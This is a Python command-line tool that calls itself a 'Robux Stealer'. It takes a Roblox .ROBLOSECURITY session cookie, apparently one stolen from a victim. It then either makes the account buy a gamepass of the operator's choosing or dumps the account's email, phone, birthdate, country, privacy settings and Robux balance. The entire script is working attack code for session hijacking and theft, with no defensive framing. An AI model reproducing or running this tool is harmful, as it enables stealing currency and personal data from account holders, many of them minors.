
import requests
import os
from bs4 import BeautifulSoup

def buy_gamepass(url,cookie):

    response = requests.get(url)

    # Get required gamepass data
    if response.status_code == 200:
        html_content = response.text

        soup = BeautifulSoup(html_content, 'html.parser')

        item_container = soup.find('div', id='item-container')

        ProductID = soup.find('div', id='item-container')['data-product-id']
        data_expected_currency = item_container['data-expected-currency']
        data_expected_price = item_container['data-expected-price']
        expected_seller_id = item_container['data-expected-seller-id']

        print('Product ID:', ProductID)
        print('data-expected-currency:', data_expected_currency)
        print('data-expected-price:', data_expected_price)
        print('data-expected-seller-id:', expected_seller_id)
    else:
        print(f'Failed to retrieve the HTML content. Status code: {response.status_code}')

    ######################################################################################

    # Create a session and set the .ROBLOSECURITY cookie
    session = requests.Session()
    session.cookies['.ROBLOSECURITY'] = cookie

    # Send the first request to get the X-CSRF token for Authentication
    req = session.post(
        url='https://auth.roblox.com/'
    )

    if 'X-CSRF-Token' in req.headers:
        # Store the X-CSRF token in the session headers
        session.headers['X-CSRF-Token'] = req.headers['X-CSRF-Token']

    # Define API Endpoint to buy gamepasses
    url2 = f'https://economy.roblox.com/v1/purchases/products/{ProductID}'

    # Send the data of the gamepass
    data = {
        'expectedCurrency': int(data_expected_currency),
        'expectedPrice': int(data_expected_price),
        'expectedSellerId': int(expected_seller_id)
    }

    # Set up the headers for Authentication
    headers = {
        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),  # Use the X-CSRF token from the session
        'Content-Type': 'application/json; charset=utf-8',
    }

    response = session.post(url2, json=data, headers=headers)

    # Check the response status and content
    if response.status_code == 200:
        print('POST request was successful!')
        print('Response content:', response.text)
    else:
        print(f'Response text:', response.text)
        print(f'POST request failed with status code {response.status_code}')

def get_roblox_data(robloxcookie):
    urls=['https://accountinformation.roblox.com/v1/description',
          'https://accountinformation.roblox.com/v1/gender',
          'https://accountsettings.roblox.com/v1/email',
          'https://accountinformation.roblox.com/v1/phone',
          'https://accountinformation.roblox.com/v1/birthdate',
          'https://accountinformation.roblox.com/v1/phone',
          'https://accountsettings.roblox.com/v1/account/settings/account-country',
          'https://accountsettings.roblox.com/v1/account/settings/metadata',
          'https://accountsettings.roblox.com/v1/app-chat-privacy',
          'https://accountsettings.roblox.com/v1/game-chat-privacy',
          'https://accountsettings.roblox.com/v1/inventory-privacy',
          'https://accountsettings.roblox.com/v1/private-message-privacy',
          'https://accountsettings.roblox.com/v1/trade-privacy',
          'https://accountinformation.roblox.com/v1/promotion-channels']
    session = requests.Session()
    session.cookies['.ROBLOSECURITY'] = robloxcookie

    req = session.post(
        url='https://auth.roblox.com/'
    )

    if 'X-CSRF-Token' in req.headers:
        session.headers['X-CSRF-Token'] = req.headers['X-CSRF-Token']

    url2 = 'https://users.roblox.com/v1/users/authenticated'

    headers = {
        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),
        'Content-Type': 'application/json; charset=utf-8',
    }

    response = session.get(url2, headers=headers)

    user_id = ''
    if response.status_code == 200:
        response_json = response.json()
        for name, key in response_json.items():
            print(name, ':', key)  # Print the username, Displayname, and ID
        user_id = response_json.get('id')
    else:
        print(f'Response text:', response.text)
        print(f'GET request failed with status code {response.status_code}')

    url3 = f'https://economy.roblox.com/v1/users/{user_id}/currency'
    response = session.get(url3, headers=headers)
    if response.status_code == 200:
        response_json = response.json()
        robux = response_json.get('robux')
        print('Robux :', robux)
    else:
        print(f'Response text:', response.text)
        print(f'GET request failed with status code {response.status_code}')

    headers = {
        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),
        'Content-Type': 'application/json; charset=utf-8',
    }

    for item in urls:
        data=session.get(item,headers=headers).json()
        for item,key in data.items():
            print(item,':',key)

print('\033[31mRobux Stealer CLI   \033[0m')
print('\033[34m [+]Buy Gamepass (1) \033[0m')
print('\033[34m [+]Get Account Info (2) \033[0m')

choice=input('\033[31m> \033[0m')

options=['1','2']
while True:
    if choice in options:
        choice=choice
        break
    else:
        os.system('clear' if os.name == 'posix' else 'cls')
        print('\033[31mRobux Stealer CLI   \033[0m')
        print('\033[34m [+]Buy Gamepass (1) \033[0m')
        print('\033[34m [+]Get Account Info (2) \033[0m')
        choice=input('\033[31m> \033[0m')

if choice=='1':
    print('\033[31mBuy Gamepass Selected\033[0m')
    
    print('\033[34m Gamepass URL: \033[0m')
    url=input('\033[31m> \033[0m')
    
    print('\033[34m ROBLOSECURITY: \033[0m')
    cookie=input('\033[31m> \033[0m')
    
    buy_gamepass(url,cookie)
elif choice=='2':
    print('\033[31mGet Account info Selected\033[0m')  
    
    print('\033[34m ROBLOSECURITY: \033[0m')
    cookie=input('\033[31m> \033[0m')
    print('')
    get_roblox_data(cookie)
    
